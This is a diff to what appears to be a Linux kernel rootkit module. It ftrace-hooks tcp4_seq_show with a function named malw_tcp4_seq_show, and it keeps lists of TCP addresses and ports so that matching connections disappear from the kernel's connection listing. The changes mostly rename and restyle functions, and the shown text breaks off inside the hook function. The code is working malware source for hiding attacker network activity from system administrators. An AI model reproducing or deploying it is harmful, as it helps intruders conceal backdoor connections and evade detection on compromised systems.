@@ -13,7 +13,8 @@ static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 struct ftrace_hook hook_tcp4_seq_show = HOOK("tcp4_seq_show", malw_tcp4_seq_show, &orig_tcp4_seq_show);
 
 
-void add_hidden_ip(char *str) {
+void add_hidden_tcp_ip(char *str)
+{
     int a, b, c, d;
     char arr[4];
     tcp_ip_size++;
@@ -25,7 +26,8 @@ void add_hidden_ip(char *str) {
     *(hidden_tcp_ips + tcp_ip_size - 1) = *(unsigned int *)arr;
 }
 
-void remove_hidden_ip(char *str) {
+void remove_hidden_tcp_ip(char *str)
+{
     int a, b, c, d;
     int i;
     int ip;
@@ -52,13 +54,15 @@ void remove_hidden_ip(char *str) {
     }
 }
 
-void add_hidden_port(int port) {
+void add_hidden_tcp_port(int port)
+{
     tcp_port_size++;
     hidden_tcp_ports = krealloc(hidden_tcp_ports, tcp_port_size*sizeof(int), GFP_KERNEL);
     *(hidden_tcp_ports + tcp_port_size - 1) = port;
 }
 
-void remove_hidden_port(int port) {
+void remove_hidden_tcp_port(int port)
+{
     int i;
     int move = 0;
     for (i = 0; i < tcp_port_size; i++) {
@@ -76,20 +80,22 @@ void remove_hidden_port(int port) {
     }
 }
 
-void install_tcp_seq_show_hook(void) {
+void install_tcp_seq_show_hook(void)
+{
     fh_install_hook(&hook_tcp4_seq_show);
 }
 
-void remove_tcp_seq_show_hook(void) {
+void remove_tcp_seq_show_hook(void)
+{
     fh_remove_hook(&hook_tcp4_seq_show);
     kfree(hidden_tcp_ports);
 }
 
-asmlinkage long malw_tcp4_seq_show(struct seq_file *seq, void *v) {
+asmlinkage long malw_tcp4_seq_show(struct seq_file *seq, void *v)
+{
     int i;
     long ret;
     struct sock *sk = v;
-
 
     for (i = 0; i < tcp_ip_size; i++) {
         if (sk != (struct sock *)0x1 && sk->sk_rcv_saddr && sk->sk_daddr) {
